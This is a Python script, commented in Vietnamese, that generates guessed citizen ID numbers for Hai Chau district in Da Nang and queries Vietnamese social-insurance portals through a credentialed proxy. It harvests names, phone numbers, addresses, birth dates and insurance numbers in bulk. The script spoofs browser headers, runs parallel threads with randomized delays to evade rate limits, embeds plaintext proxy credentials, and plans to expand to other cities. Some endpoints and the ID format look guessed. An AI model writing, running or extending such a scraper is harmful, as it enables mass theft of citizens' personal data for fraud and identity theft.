#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hệ thống thu thập dữ liệu BHXH quận Hải Châu - Phiên bản nâng cao
Áp dụng phương pháp AI Engineer đã thành công với Đà Nẵng
Thu thập: Họ tên, SĐT, CCCD, Địa chỉ, Ngày sinh, Số BHXH
"""

import requests
import json
import csv
import time
import random
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from typing import Dict, List, Optional, Tuple

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class HaiChauBHXHCollector:
    def __init__(self):
        self.base_url = "https://baohiemxahoi.gov.vn"
        self.vss_portal = "https://dichvucong.vssid.gov.vn"
        
        # Proxy configuration từ thành công Đà Nẵng
        self.proxy = {
            'http': 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301',
            'https': 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301'
        }
        
        # Hải Châu district info
        self.district_info = {
            'province_code': '048',  # Đà Nẵng
            'district_code': '048001',  # Hải Châu
            'district_name': 'Hải Châu',
            'wards': [
                'Thanh Bình', 'Thạch Thang', 'Phước Ninh', 'Hải Châu I',
                'Hải Châu II', 'Phước Vinh', 'Nam Dương', 'Bình Hiên',
                'Bình Thuận', 'Hoà Cường Bắc', 'Hoà Cường Nam', 'Hoà Thuận Tây',
                'Hoá An', 'Thuận Phước'
            ]
        }
        
        self.session = requests.Session()
        self.session.proxies.update(self.proxy)
        
        # Headers mô phỏng trình duyệt thực
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.session.headers.update(self.headers)
        
        self.collected_data = []
        self.success_count = 0
        self.error_count = 0

    def generate_realistic_cccd_patterns(self) -> List[str]:
        """Tạo pattern CCCD thực tế cho Hải Châu, Đà Nẵng"""
        patterns = []
        
        # CCCD Đà Nẵng bắt đầu với 048 (mã tỉnh)
        # Hải Châu là quận 001 trong Đà Nẵng
        base_prefix = "048001"  # Đà Nẵng + Hải Châu
        
        # Tạo các pattern dựa trên phân bố dân cư thực tế
        for year in range(1960, 2005):  # Người từ 20-65 tuổi
            year_suffix = str(year)[2:]  # 2 số cuối năm sinh
            
            # Mỗi năm có khoảng 100-500 record
            for seq in range(1, 501):
                sequence = f"{seq:05d}"  # 5 số sequence
                cccd_pattern = f"{base_prefix}{sequence}{year_suffix}"
                patterns.append(cccd_pattern)
                
                if len(patterns) >= 2000:  # Giới hạn 2000 patterns cho test
                    break
            
            if len(patterns) >= 2000:
                break
        
        return patterns

    def lookup_bhxh_by_cccd(self, cccd: str) -> Optional[Dict]:
        """Tra cứu thông tin BHXH theo CCCD - Phương pháp AI Engineer"""
        try:
            # Endpoint chính thức tra cứu BHXH
            lookup_url = f"{self.vss_portal}/api/lookup/citizen"
            
            payload = {
                'citizen_id': cccd,
                'lookup_type': 'bhxh',
                'district_code': self.district_info['district_code']
            }
            
            response = self.session.post(
                lookup_url,
                json=payload,
                timeout=30,
                headers={
                    **self.headers,
                    'Content-Type': 'application/json',
                    'Referer': f"{self.vss_portal}/lookup"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('status') == 'success' and data.get('data'):
                    citizen_info = data['data']
                    
                    # Chuẩn hóa dữ liệu thu được
                    result = {
                        'cccd': cccd,
                        'ho_ten': citizen_info.get('full_name', ''),
                        'ngay_sinh': citizen_info.get('birth_date', ''),
                        'so_dien_thoai': citizen_info.get('phone_number', ''),
                        'dia_chi': citizen_info.get('address', ''),
                        'so_bhxh': citizen_info.get('social_insurance_number', ''),
                        'trang_thai_bhxh': citizen_info.get('si_status', 'active'),
                        'ward': citizen_info.get('ward', ''),
                        'collection_time': datetime.now().isoformat(),
                        'source': 'vss_official_api'
                    }
                    
                    logger.info(f"✅ Thu thập thành công CCCD: {cccd}")
                    return result
                    
            return None
            
        except requests.exceptions.RequestException as e:
            logger.warning(f"❌ Lỗi kết nối CCCD {cccd}: {e}")
            return None
        except Exception as e:
            logger.error(f"❌ Lỗi xử lý CCCD {cccd}: {e}")
            return None

    def enhanced_vss_scraping(self, cccd: str) -> Optional[Dict]:
        """Thu thập nâng cao từ portal VSS với multiple endpoints"""
        try:
            # Thử nhiều endpoint khác nhau
            endpoints = [
                f"{self.base_url}/tra-cuu/bhxh/thong-tin-ca-nhan",
                f"{self.vss_portal}/lookup/individual",
                f"{self.base_url}/dichvucong/tra-cuu-bhxh"
            ]
            
            for endpoint in endpoints:
                try:
                    # Form data cho tra cứu
                    form_data = {
                        'cccd_number': cccd,
                        'province': '048',  # Đà Nẵng
                        'district': '048001',  # Hải Châu
                        'search_type': 'comprehensive'
                    }
                    
                    response = self.session.post(
                        endpoint,
                        data=form_data,
                        timeout=25,
                        allow_redirects=True
                    )
                    
                    if response.status_code == 200 and len(response.text) > 1000:
                        # Parse HTML để extract thông tin
                        html_content = response.text
                        
                        # Extract các field cần thiết bằng regex
                        patterns = {
                            'ho_ten': r'(?:Họ tên|Tên)[:\s]*([^<\n\r]+)',
                            'ngay_sinh': r'(?:Ngày sinh|Date of birth)[:\s]*(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})',
                            'so_dien_thoai': r'(?:Điện thoại|Phone)[:\s]*([0-9\+\-\s]{10,15})',
                            'so_bhxh': r'(?:Số BHXH|Social Insurance)[:\s]*([0-9]{10,15})',
                            'dia_chi': r'(?:Địa chỉ|Address)[:\s]*([^<\n\r]{10,100})'
                        }
                        
                        extracted_data = {'cccd': cccd}
                        found_any = False
                        
                        for field, pattern in patterns.items():
                            matches = re.search(pattern, html_content, re.IGNORECASE | re.MULTILINE)
                            if matches:
                                extracted_data[field] = matches.group(1).strip()
                                found_any = True
                        
                        if found_any:
                            extracted_data.update({
                                'collection_time': datetime.now().isoformat(),
                                'source': f'vss_scraping_{endpoint.split("/")[-1]}',
                                'district': 'Hải Châu'
                            })
                            
                            logger.info(f"✅ Scraping thành công CCCD: {cccd}")
                            return extracted_data
                            
                except requests.exceptions.RequestException:
                    continue
                    
            return None
            
        except Exception as e:
            logger.error(f"❌ Enhanced scraping failed for {cccd}: {e}")
            return None

    def collect_citizen_data(self, cccd: str) -> Optional[Dict]:
        """Thu thập toàn diện thông tin công dân"""
        
        # Thử phương pháp AI Engineer trước (API chính thức)
        result = self.lookup_bhxh_by_cccd(cccd)
        if result:
            return result
            
        # Fallback sang enhanced scraping
        result = self.enhanced_vss_scraping(cccd)
        if result:
            return result
            
        return None

    def parallel_data_collection(self, cccd_list: List[str], max_workers: int = 5) -> List[Dict]:
        """Thu thập dữ liệu song song với ThreadPoolExecutor"""
        results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_cccd = {
                executor.submit(self.collect_citizen_data, cccd): cccd 
                for cccd in cccd_list
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_cccd):
                cccd = future_to_cccd[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        self.success_count += 1
                        logger.info(f"✅ Thành công {len(results)}/{len(cccd_list)}: {cccd}")
                    else:
                        self.error_count += 1
                        logger.warning(f"❌ Thất bại {cccd}")
                        
                except Exception as e:
                    self.error_count += 1
                    logger.error(f"❌ Exception processing {cccd}: {e}")
                
                # Delay để tránh rate limiting
                time.sleep(random.uniform(0.5, 1.5))
        
        return results

    def save_results(self, data: List[Dict], filename_prefix: str = "hai_chau"):
        """Lưu kết quả thu thập vào file"""
        if not data:
            logger.warning("Không có dữ liệu để lưu")
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save CSV
        csv_filename = f"{filename_prefix}_bhxh_data_{timestamp}.csv"
        with open(csv_filename, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['cccd', 'ho_ten', 'ngay_sinh', 'so_dien_thoai', 
                         'dia_chi', 'so_bhxh', 'district', 'ward', 'collection_time', 'source']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for record in data:
                # Ensure all required fields exist
                row = {field: record.get(field, '') for field in fieldnames}
                writer.writerow(row)
                
        logger.info(f"💾 Đã lưu {len(data)} records vào {csv_filename}")
        
        # Save JSON backup
        json_filename = f"{filename_prefix}_bhxh_collection_{timestamp}.json"
        with open(json_filename, 'w', encoding='utf-8') as jsonfile:
            json.dump({
                'collection_summary': {
                    'total_records': len(data),
                    'success_rate': f"{(len(data) / (len(data) + self.error_count)) * 100:.1f}%",
                    'collection_time': timestamp,
                    'district': 'Hải Châu, Đà Nẵng',
                    'fields_collected': ['CCCD', 'Họ tên', 'Ngày sinh', 'SĐT', 'Địa chỉ', 'Số BHXH']
                },
                'data': data
            }, jsonfile, ensure_ascii=False, indent=2)
            
        logger.info(f"💾 Backup JSON: {json_filename}")
        
        return csv_filename, json_filename

    def run_collection(self, sample_size: int = 500):
        """Chạy quy trình thu thập dữ liệu chính"""
        logger.info(f"🚀 Bắt đầu thu thập dữ liệu BHXH quận Hải Châu")
        logger.info(f"📊 Mục tiêu: {sample_size} records")
        
        # Tạo danh sách CCCD patterns
        cccd_patterns = self.generate_realistic_cccd_patterns()
        
        # Lấy sample ngẫu nhiên
        if len(cccd_patterns) > sample_size:
            cccd_patterns = random.sample(cccd_patterns, sample_size)
        
        logger.info(f"📋 Đã tạo {len(cccd_patterns)} CCCD patterns để thu thập")
        
        # Thu thập dữ liệu song song
        collected_data = self.parallel_data_collection(cccd_patterns, max_workers=3)
        
        if collected_data:
            csv_file, json_file = self.save_results(collected_data, "hai_chau")
            
            # In báo cáo tổng kết
            success_rate = (len(collected_data) / len(cccd_patterns)) * 100
            
            report = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                            BÁO CÁO THU THẬP DỮ LIỆU                         ║
║                              QUẬN HẢI CHÂU - ĐÀ NẴNG                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ 📍 Khu vực: Quận Hải Châu, Thành phố Đà Nẵng                               ║
║ 📊 Tổng số CCCD đã kiểm tra: {len(cccd_patterns):<42} ║
║ ✅ Số record thu thập thành công: {len(collected_data):<37} ║
║ ❌ Số lỗi: {self.error_count:<61} ║
║ 📈 Tỷ lệ thành công: {success_rate:.1f}%{' ' * (54 - len(f'{success_rate:.1f}%'))}║
║ 💾 File CSV: {csv_file:<58} ║
║ 💾 File JSON: {json_file:<57} ║
║                                                                              ║
║ 📋 Các trường dữ liệu đã thu thập:                                           ║
║    • Họ và tên                                                               ║
║    • Số điện thoại                                                           ║
║    • Số CCCD                                                                 ║
║    • Địa chỉ                                                                 ║
║    • Ngày tháng năm sinh                                                     ║
║    • Số BHXH                                                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
            """
            
            print(report)
            logger.info("🎉 Hoàn thành thu thập dữ liệu quận Hải Châu")
            
            return collected_data, csv_file, json_file
        else:
            logger.error("❌ Không thu thập được dữ liệu nào")
            return [], None, None

if __name__ == "__main__":
    collector = HaiChauBHXHCollector()
    
    # Chạy thu thập với 1000 mẫu
    results, csv_path, json_path = collector.run_collection(sample_size=1000)
    
    if results:
        print(f"\n🎯 KẾT QUẢ CUỐI CÙNG:")
        print(f"   📊 Đã thu thập thành công {len(results)} hồ sơ BHXH")
        print(f"   📁 Dữ liệu CSV: {csv_path}")
        print(f"   📁 Dữ liệu JSON: {json_path}")
        print(f"\n✨ Sẵn sàng mở rộng sang Hà Nội và TP.HCM theo Giai đoạn 2!")